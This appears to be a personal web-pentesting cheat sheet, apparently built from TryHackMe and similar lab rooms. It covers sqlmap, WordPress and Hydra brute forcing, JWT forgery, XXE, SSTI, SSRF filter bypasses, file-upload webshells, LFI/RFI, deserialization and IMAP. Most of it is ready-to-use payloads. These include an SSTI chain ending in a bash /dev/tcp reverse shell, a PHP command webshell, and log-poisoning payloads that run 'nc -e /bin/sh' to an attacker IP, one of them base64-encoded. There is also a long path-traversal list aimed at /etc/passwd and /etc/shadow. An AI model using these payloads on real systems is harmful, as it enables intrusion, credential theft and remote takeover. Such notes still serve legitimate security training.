		sqlmap -r req.raw --batch --level 5 --threads 10 --risk 3 --dbms mysql --tamper=charunicodeescape --proxy http://127.0.0.1:8080 --technique=T --time-sec=2

# SUBDOMAINS ENUMERATION
## KNOCK
https://github.com/guelfoweb/knock  

	python knockpy.py domain.com

# Bypass extensions policies in forms with Intruders
https://portswigger.net/burp/documentation/desktop/tools/intruder/payloads/types#recursive-grep  
https://github.com/monstra-cms/monstra/issues/429  

If some files are blocked to be uploaded then we can use intruder to try different extensions.

E.g: php, php3, php4, php5, phtml etc...

	$forbidden_types = array('html', 'htm', 'js', 'jsb', 'mhtml', 'mht',

	                               **'php', 'phtml', 'php3', 'php4', 'php5', 'phps',**

	                                'shtml', 'jhtml', 'pl', 'py', 'cgi', 'sh', 'ksh', 'bsh', 'c', 'htaccess', 'htpasswd',

	                                'exe', 'scr', 'dll', 'msi', 'vbs', 'bat', 'com', 'pif', 'cmd', 'vxd', 'cpl', 'empty');

# WORDPRESS
Base command

	wpscan --url http://10.10.10.10

Enumerate users

	wpscan --url http://10.10.10.10 -eu

Brute force

	wpscan --url http://10.10.10.10 -U admin -P passwords.lst -t 50

If WPscan doesn't find any plugins, we can verify if any plugins is installed by checking the directory manually. Important in case if we find some plugins exploits.

E.g: http://jack.thm/wp-content/plugins/user-role-editor/readme.txt

# Login Bypass
## REGISTER AS ANOTHER USER
- Try to register as another user by putting as space before the username.

		'admin' becomes ' admin'

- Try to bypass with a sql injection (see above, inside sql injection section)
- Try to put any type of special charachter inside the username or passwrod. It could be possible to bypass with an `LDAP` injection or something similar.
- Try classic injections like `OR 1=1;` etc... Check `payloadallthethings` repo to get all of these.

## Brute Force passwords with HYDRA

	hydra -L ./users -P ./Passwords oopsie http-post-form "/cdn-cgi/login/index.php:username=^USER^&password=^PASS^:Login"

## Bypass login by identifying different body responses

- Using Zap, create a fuzzer with different payloads for the username.
- In the `message processor` tab, use the script to identify differences in the body reponses. (it has to be enabled first)
- Start the fuzzer.
- We should look for the response length but sometimes the difference can be very subtle, like `.` might replaced by a space or something else.

## Bypass login by enumerating users via response timing

- Try to send a valid username with a very long password like this:

		username:validUsername&password:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

	- If the response time is longer than with a short password, then we know that it's because the username is valid so we can try to enumerate more usernames with the same technique.
	- Use `Burp` or `Zap` to brute force the username param with the same very long password.

## Avoid IP Based Brute force Protection

- Try to add the `X-Forwarded-For:` header field and see if the server react differently.
- If yes, we can FUZZ the server by adding this field along with our initial payload.
- We need to use `Burp` to do that.
- In `Intruder`, the attack type has to be set on `pitchfork`.
- Then, we put a payload on the ip address of the `x-forwarded-for` field.
- Next, a payload for the param that we want to fuse.
- Start the attack.

## Bypass login attempts protection with valid creds

If we already know valid creds and the server has a protection that count the number of attempts from you IP, we could bypass that by using burp.

- Create a username list, alterning between valid username and the other usernames to fuzz.
- Create a password list, alterning between the valid passowrd and the  other passwords to fuzz.
- Using `Burp`, go to `intruder` and set the type of attack to `pichfork`.
- Set the payloads on the username and the passord.
- Use both wordlists for the payloads.

# JWT TOKEN
https://tryhackme.com/room/authenticate  

JSON Web Token(JWT) is one of the commonly used methods for authorization. This is a kind of cookie that is generated using HMAC hashing or public/private keys. So unlike any other kind of cookie, it lets the website know what kind of access the currently logged in user has. The only special thing about JWT is that they are in JSON format(after decoding).

JWT can be divided into 3 parts separated by a dot(.)

- Header:  

		{"alg": "HS256", "typ": "JWT"}

`alg` could be HMAC, RSA, SHA256 or can even contain `None` value.

- Payload:  

- Signature: This is the part that is used to make sure that the integrity of the data was maintained while transferring it from a user's computer to the server and back. This is encrypted with whatever algorithm or alg  

Now to put all the 3 part together we base64 encode all of them separated by a dot(.) so it would look something like:

	eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

## Exploitation
If used properly this is a very secure way of authorization but the problem is with using is "properly". A lot of developers misconfigure their system leaving it open to exploitation.

Now one of the methods to exploit this is to perform a brute force/dictionary attack and find the secret used for encrypting the JWT token and then used that to generate new tokens. But here we are not going to do that, we are going to see a very amazing way of exploiting this.

If you remember, in the Header section I said that the **alg** can be whatever the algorithm is used and also it can be **None** if no encryption is to be used. Now, this should not be used when the application is in production but again the problem of misconfiguration comes in and make the application vulnerable to this kind of attack. The attack is that an attacker can log in as low privilege user says **guest** and then get the JWT token for that user and then decode the token and edit the headers to use set **alg** value to **None**. This would mean that no encryption has to be used therefore the attacker wouldn't need the secret used for encryption.

## Practical
Let's see this method in practice. For this challenge visit the port 5000.

It is a very simple login page and in that, you can log in via two users: user and user2. Now first let's try to login with the credentials of **user:user** . To do so first enter those credentials then click on the **Authenticate** button and then enable the capture in burp suite and then click on **the Go **button. In the burp tab, you should see a request to **/protected** and there you'll see the JWT token.

https://imgur.com/sLKHY9  


![ref](https://imgur.com/sLKHY9V.png)

Now take this JWT token and then you can decode it part by part.

So if we decode the first part, which will do:

	{"typ":"JWT","alg":"HS256"}

and decoding the 2nd part, we will get:

	{"exp":1586620929,"iat":1586620629,"nbf":1586620629,"identity":1}

If you try to decode the 3rd part then you'll get some gibberish. But that is okay we only need the first and the second part.

Now if we notice the **identity** value that is probably being used to identify the user but if you'll just edit that then it won't work because as I said the 3rd part is encrypted. So to bypass this we will make changes in the header as well as the value of the identity.

Encode the following string with base64 and that will be our first part

	{"typ":"JWT","alg":"NONE"}

For the second part, we'll encode the following string:

	{"exp":1586620929,"iat":1586620629,"nbf":1586620629,"identity":2}

Notice how we changed the value of **identity** from **1  **to **2**.

Since we placed the alg value to None we don't have to add a 3rd part or the encrypted value so we can just put a dot(.) after 2nd part and leave it like that. So the final string would look like:

	eyJ0eXAiOiJKV1QiLCJhbGciOiJOT05FIn0K.eyJleHAiOjE1ODY3MDUyOTUsImlhdCI6MTU4NjcwNDk5NSwibmJmIjoxNTg2NzA0OTk1LCJpZGVudGl0eSI6MH0K.

Now open the developer's tools in your browser and edit the stored cookie of the website to this new one and then just press the

- Go  
In a similar manner, you can try to play and find other users on the website.

This kind of misconfiguration in the authentication system is common and could be exploited to escalate privileges or steal information.

## Second exploitation
https://habr.com/en/post/450054/  
https://tryhackme.com/room/zthobscurewebvulns  

Change the alg fron RS256 to HS256 and manipulate the public key from the server.

https://tryhackme.com/room/zthobscurewebvulns  

- MANUAL METHOD  

	![ref](https://imgur.com/ygQg3D8.png)

	With a JWT, and a JWT verifier. Sending it garbage results in a failure, so let's try decoding the JWT.  

	![ref](https://imgur.com/RItwOM3.png)

	Decoding the JWT gives us our header, payload, and a bunch of garbage which is the secret.

	![ref](https://imgur.com/wgGLkHA.png)

	Unfortunately it seems the algorithm is RS256, which doesn't have any vulnerabilities. Fortunately for us though, this server leaves its public key lying around, which means we can change the algorithm and sign a new secret! The first step is to change the algorithm in the header to HS256, and then re encode it in base64. Our new JWT is:
	
		eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vbG9jYWxob3N0IiwiaWF0IjoxNTg1MzIzNzg0LCJleHAiOjE1ODUzMjM5MDQsImRhdGEiOnsiaGVsbG8iOiJ3b3JsZCJ9fQ.FXj9F1jIXlhMyoQAo5-XPOiZeP4Ltw5XXZGqgX49tKkYUOeirOXUDgWL4bqP9nRXIODqOByqS_9O11nQN5bC_LTpfBWG2WZXg0tKIDAbKTxVkrytXBmOkP1qRK_Apv-CQs-mouuS1we8SHYShW_r4DEj0qAF3dsWVVzbRWNMH4Oc_odHNogv00dVlABcxMyXFpNJbeRS6-GCS-A4SFM32gMv_mkfkXrQPdejKDU_sKZrD5VVAmDlu0BainIvD28l8uV3OCc37shtPW0TKoIwUXmGsFYouKqk-h0dz4aTBLKJk7L64XdrA7ts1oOtzk8KqV6gnqXDXUNkzDX3qd9JKA

	The next step is to convert the public key to hex so openssl will use it.

	![ref](https://imgur.com/ZoOsCaO.png)

	(Explanation: a is the file with the public key, xxd -p turns the contents of a file to hex, and tr is there to get rid of any newlines)

	The next step is to use openssl to sign that as a valid HS256 key.

	![ref](https://imgur.com/tYWFci2.png)

	Everything is going just fine so far!. The final step is to decode that hex to binary data, and reencode it in base64, luckily python makes this really easy for us.

	![ref](https://imgur.com/XfR9H8t.png)

	That's our final secret, now we just put that where the secret should go, and the server should accept it.

	So our final JWT would beeyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.<payload>.<new secret>

	![ref](https://imgur.com/mdsgxHx.png)

- AUTOMATIC METHOD  
https://www.tariqhawis.com/htb-under-construction-web-challange/  

	We can use jwt_tool.py to change the payload and create the new signature.

	Be carreful and copy the certificate directly from the stdout of the tool or if the certificate is not inside the payload, then use an online tool or pay attention to the format of the key.

	Here is a valid format for the certificate. (doesn't work without the line break !!!)
	```
	-----BEGIN PUBLIC KEY-----
	MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA95oTm9DNzcHr8gLhjZaY
	ktsbj1KxxUOozw0trP93BgIpXv6WipQRB5lqofPlU6FB99Jc5QZ0459t73ggVDQi
	XuCMI2hoUfJ1VmjNeWCrSrDUhokIFZEuCumehwwtUNuEv0ezC54ZTdEC5YSTAOzg
	jIWalsHj/ga5ZEDx3Ext0Mh5AEwbAD73+qXS/uCvhfajgpzHGd9OgNQU60LMf2mH
	+FynNsjNNwo5nRe7tR12Wb2YOCxw2vdamO1n1kf/SMypSKKvOgj5y0LGiU3jeXMx
	V8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr
	0wIDAQAB
	-----END PUBLIC KEY-----
	```

## Brute forcing JWT
https://github.com/lmammino/jwt-cracker  

To brute force these secrets we'll be using a tool called [jwt-cracker](https://github.com/lmammino/jwt-cracker). The syntax of jwt-cracker isjwt-cracker <token> [alphabet] [max-length] where alphabet and max-length are optional parameters.

Explanation of Paramaters:

|     |     |
| --- | --- |
| Token | The HS256 JWT token |
| Alphabet | The alphabet that the cracker will use to check passwords(default: "abcdefghijklmnopqrstuvwxyz") |
| max-length | The max expected length of the secret(12 by default) |

Using an example token from jwt.io lets see how long it takes to crack.


![ref](https://imgur.com/Ov20ZaE.png)

In 4 seconds, we've tried 300000 passwords and cracked the secret!

# XXE
https://tryhackme.com/room/xxe  
https://tryhackme.com/room/zthobscurewebvulns  

An XML External Entity (XXE) attack is a vulnerability that abuses features of XML parsers/data. It often allows an attacker to interact with any backend or external systems that the application itself can access and can allow the attacker to read the file on that system. They can also cause Denial of Service (DoS) attack or could use XXE to perform Server-Side Request Forgery (SSRF) inducing the web application to make requests to other applications. XXE may even enable port scanning and lead to remote code execution.

There are two types of XXE attacks: in-band and out-of-band (OOB-XXE).

## DTD
https://tryhackme.com/room/xxe  

DTD files are used to validate xml documents. They have their own syntax to create element, entities etc...

E.g : `!DOCTYPE` stands for create a new root element.

- Example of payload  

		<?xml version="1.0"?>
		<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
		<root>&read;</root>

	Here we create an entity (read) wich takes a command as 'value'.

## ZTH
https://tryhackme.com/room/zthobscurewebvulns  

## SSTI (Template injection)
https://github.com/epinna/tplmap  
https://portswigger.net/research/template-injection  
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection  
https://www.we45.com/blog/server-side-template-injection-a-crash-course-  

A template engine allows developers to use static HTML pages with dynamic elements. Take for instance a static profile.html page, a template engine would allow a developer to set a username parameter, that would always be set  to the current user's username

Server Side Template Injection, is when a user is able to pass in a parameter that can control the template engine that is running on the server.

For example take the code


![ref](https://imgur.com/GAO1km1.png)

This introduces a vulnerability, as it allows a hacker to inject template code into the website. The effects of this can be devastating, from XSS, all the way to RCE.

Note: Different template engines have different injection payloads, however usually you can test for SSTI using {{2+2}} as a test.


![ref](https://imgur.com/CdzYeHS.png)

Then use payload from payload all  the things to get lfi etc...n (look for template inclusion)

TPLMap can be use to automate the process.
https://github.com/epinna/tplmap  

	tplmap.py -u http://10.10.10.10:8080 -d 'name'

## Exploit the SSTI by writing an evil config file.
- evil config  

		{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}

- load the evil config  

		{{ config.from_pyfile('/tmp/evilconfig.cfg') }}

- connect to evil host  

		{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }}

# SSRF
https://tryhackme.com/room/ssrf  
https://resources.infosecinstitute.com/topic/the-difference-between-cross-site-and-server-side-request-forgery/  
https://blog.doyensec.com/2019/07/22/jackson-gadgets.html  

Server-Side Request Forgery (SSRF) attacks are designed to exploit how a server processes external information. Some web applications may be designed to read information from or write information to a particular URL (like a REST API). If an attacker can modify the target URL, they can potentially exfiltrate sensitive information from the application or inject untrusted input into it.

In simpler terms, SSRF is a vulnerability in web applications whereby an attacker can make further HTTP requests through the server. An attacker can make use of this vulnerability to communicate with any internal services on the server's network which are generally protected by firewalls.

![ssrf_schema](https://portswigger.net/web-security/images/server-side%20request%20forgery.svg)

## SSRF Detection
- Is the webapp provide a way to enter a url via an input.
- Is it a `rest api` ?
- Is there any url in a params ?

- Try to enter or replace the `url` with something like http://127.0.0.1:3306 or http://127.0.0.1/amdin and check the response.

- Look for `open redirection` in the page and try to use it with the `SSRF` injection.

		<a href="/product/nextProduct?currentProductId=4&amp;path=/product?productId=5">| Next product</a>

		stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos

## SSRF Exploitation
- Scan address range, looking for admin panel etc...
- Scan every port on every addresses to find open ports.
- We can also read files from the server, but only if we use the proper schema (i.e for a HTTP request we would start the URL with "http://" -- in a similar manner if we start the URL with "file://" it would then try to read the files from the server itself).
	- file:///etc/passwd

## Bypass sanitazed input
- Using ipv6
	- http://[::]:3306
	- http://:::3306

- Using hexadecimal encoding
	- [http://2130706433](http://2130706433)
	- http://0x7f000001

- Using shorter address
	- http://127.1/admin

- Using double url encoding
	- http://127.1/%2561dmin

## Bypass domain whitelist
If a param only accept a specific url as the hostname, try that technique to bypass it.

```
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 58

"External stock check host must be stock.weliketoshop.net"
```

- Try to put a username before the hostname and see if it is accepted by the server.

		stockApi=http://username%2523@stock.weliketoshop.net

- Try to put a `#` after the username to comment the last part of the url.

		stockApi=http://username#@stock.weliketoshop.net

- Try to double url encode the `#` with `%2523`

		stockApi=http://username%2523@stock.weliketoshop.net

- If we got a `500` error, then we can try something like this.

		stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin


# Upload files
A good start to enumerating this manually would be by making a request to the website and intercepting the response with Burpsuite. Headers such as server or x-powered-by can be used to gain information about the server.

If we can upload files on the servers, try to check if we can uplaod a file and overwrite an existing file.

There are two basic ways to achieve RCE on a webserver: webshells, and reverse shells. As a general methodology, we would be looking to upload a shell of one kind or another.

Try something simple first like this

	<?php
	    echo system($_GET["cmd"]);
	?>

- *Magic Number validation:*  

	![ref](https://i.imgur.com/vHQWOgi.png)

	Unlike Windows, Unix systems use magic numbers for identifying files; however, when dealing with file uploads, it is possible to check the magic number of the uploaded file to ensure that it is safe to accept. This is by no means a guaranteed solution, but it's more effective than checking the extension of a file.

## File Name Filtering
As touched upon previously, files uploaded to a server should be unique. Usually this would mean adding a random aspect to the file name, however, an alternative strategy would be to check if a file with the same name already exists on the server, and give the user an error if so.

## File Content Filtering
More complicated filtering systems may scan the full contents of an uploaded file to ensure that it's not spoofing its extension, MIME type and Magic Number.

# LFI
Using LFI an attacker can retrieve files from the local server also he can execute files of the local server.

## File Path Traversal
File path traversal is a subset of Local file inclusion. As LFI can also execute files after retrieving it, this extra thing makes it different from file path traversal and hence the other must be checked during assessments if one is successful.

### Example of payloads and Files to look for.

		....//....//....//etc/passwd

		..%252f..%252f..%252fetc/passwd

		/etc/master.passwd

		/master.passwd

		etc/passwd

		etc/shadow%00

		/etc/passwd

		/etc/passwd%00

		../etc/passwd

		../etc/passwd%00

		../../etc/passwd

		../../etc/passwd%00

		../../../etc/passwd

		../../../etc/passwd%00

		../../../../etc/passwd

		../../../../etc/passwd%00

		../../../../../etc/passwd

		../../../../../etc/passwd%00

		../../../../../../etc/passwd

		../../../../../../etc/passwd%00

		../../../../../../../etc/passwd

		../../../../../../../etc/passwd%00

		../../../../../../../../etc/passwd

		../../../../../../../../etc/passwd%00

		../../../../../../../../../etc/passwd

		../../../../../../../../../etc/passwd%00

		../../../../../../../../../../etc/passwd

		../../../../../../../../../../etc/passwd%00

		../../../../../../../../../../../etc/passwd

		../../../../../../../../../../../etc/passwd%00

		../../../../../../../../../../../../etc/passwd

		../../../../../../../../../../../../etc/passwd%00

		../../../../../../../../../../../../../etc/passwd

		../../../../../../../../../../../../../etc/passwd%00

		../../../../../../../../../../../../../../etc/passwd

		../../../../../../../../../../../../../../etc/passwd%00

		../../../../../../../../../../../../../../../etc/passwd

		../../../../../../../../../../../../../../../etc/passwd%00

		../../../../../../../../../../../../../../../../etc/passwd

		../../../../../../../../../../../../../../../../etc/passwd%00

		../../../../../../../../../../../../../../../../../etc/passwd

		../../../../../../../../../../../../../../../../../etc/passwd%00

		../../../../../../../../../../../../../../../../../../etc/passwd

		../../../../../../../../../../../../../../../../../../etc/passwd%00

		../../../../../../../../../../../../../../../../../../../etc/passwd

		../../../../../../../../../../../../../../../../../../../etc/passwd%00

		../../../../../../../../../../../../../../../../../../../../etc/passwd

		../../../../../../../../../../../../../../../../../../../../etc/passwd%00

		../../../../../../../../../../../../../../../../../../../../../etc/passwd

		../../../../../../../../../../../../../../../../../../../../../etc/passwd%00

		../../../../../../../../../../../../../../../../../../../../../../etc/passwd

		../../../../../../../../../../../../../../../../../../../../../../etc/passwd%00

		../../../../../../../../../../../../../../../../../../../../../../etc/shadow%00

		../../../../../../etc/passwd&=%3C%3C%3C%3C

		../../../administrator/inbox

		../../../../../../../dev

		.htpasswd

		passwd

		passwd.dat

		pass.dat

		.htpasswd

		/.htpasswd

		../.htpasswd

		.passwd

		/.passwd

		../.passwd

		.pass

		../.pass

		members/.htpasswd

		member/.htpasswd

		user/.htpasswd

		users/.htpasswd

		root/.htpasswd

		db.php

		data.php

		database.asp

		database.js

		database.php

		dbase.php a

		admin/access_log

		../users.db.php

		users.db.php

		/core/config.php

		config.php

		config.js

		../config.js

		config.asp

		../config.asp

		_config.php

		../_config.php

		../_config.php%00

		../config.php

		config.inc.php

		../config.inc.php

		/config.asp

		../config.asp

		/../../../../pswd

		/admin/install.php

		../install.php

		install.php

		..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd

		..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow

		..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd

		..%2F..%2F..%2F%2F..%2F..%2Fetc/shadow

		..%2F..%2F..%2F%2F..%2F..%2F%2Fvar%2Fnamed

		..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/boot.ini

		/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd

		/..\..\..\..\..\..\winnt\win.ini

		../../windows/win.ini

		..//..//..//..//..//boot.ini

		..\../..\../boot.ini

		..\../..\../..\../..\../boot.ini

		\…..\\\…..\\\…..\\\

		=3D “/..” . “%2f..

		d:\AppServ\MySQL

		c:\AppServ\MySQL

		c:WINDOWS/system32/

		/C:\Program Files\

		/D:\Program Files\

		/C:/inetpub/ftproot/

		/boot/grub/grub.conf

		/proc/interrupts

		/proc/cpuinfo

		/proc/meminfo

		../apache/logs/error.log

		../apache/logs/access.log

		../../apache/logs/error.log

		../../apache/logs/access.log

		../../../apache/logs/error.log

		../../../apache/logs/access.log

		../../../../../../../etc/httpd/logs/acces_log

		../../../../../../../etc/httpd/logs/acces.log

		../../../../../../../etc/httpd/logs/error_log

		../../../../../../../etc/httpd/logs/error.log

		../../../../../../../var/www/logs/access_log

		../../../../../../../var/www/logs/access.log

		../../../../../../../usr/local/apache/logs/access_ log

		../../../../../../../usr/local/apache/logs/access. log

		../../../../../../../var/log/apache/access_log

		../../../../../../../var/log/apache2/access_log

		../../../../../../../var/log/apache/access.log

		../../../../../../../var/log/apache2/access.log

		../../../../../../../var/log/access_log

		../../../../../../../var/log/access.log

		../../../../../../../var/www/logs/error_log

		../../../../../../../var/www/logs/error.log

		../../../../../../../usr/local/apache/logs/error_l og

		../../../../../../../usr/local/apache/logs/error.l og

		../../../../../../../var/log/apache/error_log

		../../../../../../../var/log/apache2/error_log

		../../../../../../../var/log/apache/error.log

		../../../../../../../var/log/apache2/error.log

		../../../../../../../var/log/error_log

		../../../../../../../var/log/error.log

		/etc/init.d/apache

		/etc/init.d/apache2

		/etc/httpd/httpd.conf

		/etc/apache/apache.conf

		/etc/apache/httpd.conf

		/etc/apache2/apache2.conf

		/etc/apache2/httpd.conf

		/usr/local/apache2/conf/httpd.conf

		/usr/local/apache/conf/httpd.conf

		/opt/apache/conf/httpd.conf

		/home/apache/httpd.conf

		/home/apache/conf/httpd.conf

		/etc/apache2/sites-available/default

		/etc/apache2/vhosts.d/default_vhost.include

		/etc/passwd

		/etc/shadow

		/etc/group

		/etc/security/group

		/etc/security/passwd

		/etc/security/user

		/etc/security/environ

		/etc/security/limits

		/usr/lib/security/mkuser.default

- Get the MAC Address of the target
	- First get the active network interface

			/proc/net/arp

	- Then get the MAC address for that interface

			/sys/class/net/<device id>/address

- Get the target machine ID

		/etc/machine-id

### Directory / File path traversal identification

- Analyse the html code or the requested url and check for suspicious filenames like this:

		filename=1


### Exploit a path traversal vulnerability

We can try these exploits by modifying the html code directly or by intercepting the request with `zap`. We should try both !

- Simple case scenario

		filename=../../../../../etc/passwd
		filename=....//....//....//etc/passwd

- Bypass input sanitizing by encoding the url

		..%252f..%252f..%252fetc/passwd

	`%25` = `%`  
	`%2f` = `/`

- Sometimes the servers looks for a path begining with a specific folder like this:

		/image?filename=/var/www/images/myimage.png

	We can modify the request like this:

		/image?filename=/var/www/images/../../../../../etc/passwd

- Nul byte termination attack (if the server looks like a specific file extendsion)

		/image?filename=/var/www/images/../../../../../etc/passwd%00.png

## Execute some code on the remote server with LFI
We can get a shell to the target by tricking these files.

### PROC/SELF/ENVIRON
The proc/self/environ contains information about the environment.

If we can access that file from LFI, than we can modify the user-agent request to execute some codes.

![image.png](../_resources/5522a2a21cfcad75639e1c3f083b761b.png)

- Example of payload  

		passthru("nc -e /bin/sh 10.20.14.9 2222");

### /VAR/LOG/AUTH.LOG or /VAR/LOG/APACHE2/ACCESS.LOG
It contains all the login attempts on the server.

- Access the `auth.log` file via LFI.
- Try to log in into the server. For example via `ssh.`
- Check the `auth.log` file again and look for the login attemp that we just made.
- Try to log in again but this time, we should put a malicious code instead of the username

		ssh "<?passthru('nc -e /bin/sh 10.20.14.2 2222');?>"@10.10.10.10

	For security reason and because there are a lot of space etc... we should encrypt the command in base 64.

			echo "nc -e /bin/sh 10.20.14.2 2222" | base64
			bmMgLWUgL2Jpbi9zaCAxMC4yMC4xNC4yIDIyMjIK

	Then we tell php to decode the command once it gets executed

		ssh "<?passthru(base64_decode('bmMgLWUgL2Jpbi9zaCAxMC4yMC4xNC4yIDIyMjIK'));?>"@10.10.10.10

- Then access the log file via LFI.

***We can try this techniques with all the logs files as long as we have access to it.***  

# RFI
Similar to LFI but this time, instead of access a file localy, we try to access a file on a remote machine.

- Create a web server
- Write a simple txt file with a malicious code

	![image.png](../_resources/e5e125940a27cf48419c6d063d7951a3.png)

- Access it via the browser

	![image.png](../_resources/9cf781d8ebbb55e4b3354fc4cc1344a0.png)

	We can try to bypass filters by replace http by hTTp, for example.

# Web Cache Poisoning
[reference](https://snyk.io/blog/cache-poisoning-in-popular-open-source-packages/?utm_source=newsletter&utm_medium=email&utm_campaign=bug_bytes_107_go_for_http_smuggling_open_source_frameworks_vs_cache_poisoning_practicing_rce_in_nodejs_apps&utm_term=2021-02-01)
## What is a cache proxy?
Cache proxy is a part of a `reverse proxy` – an intermediate connection between the client and the web server.

## How does caching work?
Caching is storing frequently accessed content in order to speed up subsequent requests to access that content.

Cache keys are used in order for the cache to keep references to the responses. Typically, a cache key consists of the values of one or more response headers and a part of the URL.

For example, for the following HTTP request, the cache key might be localhost/p/?a=1.

		GET /p/?a=1 HTTP/1.1
		Host: localhost
		Origin: example
		Accept-Encoding: gzip, deflate
		Accept-Language: en-US,en;q=0.9

When receiving a new request, if the cache is able to find a matching cache key then the saved response will be served instead of generating a new response.

As can be seen in the example above, there are headers which can possibly affect the response but are not reflected in the cache key. This means that if we change their values, the response will get saved in the same cache “spot”, but with a different value.

# Object Deserialization
## YSOSERIAL
https://github.com/frohoff/ysoserial
https://www.redtimmy.com/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/

[pdf_001](/home/r0ck/Documents/pdf/deserialization-vulnerability.pdf)

## Create a java object that execute a piece of code

	java -jar ~/toolbox/ysoserial-master-SNAPSHOT.jarsoserial-master-SNAPSHOT.jar CommonsCollections2 'bash /tmp/shell.sh' > executepayload.session

# Attacking IMAP
- Check IPPSec videos (Chaos 15:00)

- Connection with ncat

		nc(or ncat or telnet) 10.10.10.197 143 (or 993)

- Try login with this command

		A1 LOGIN username password

- A1 should be replace by something like this:

		GhostIsGreat LOGIN username password

Ifwe have a successful login, then we can use evolution to get the emails.

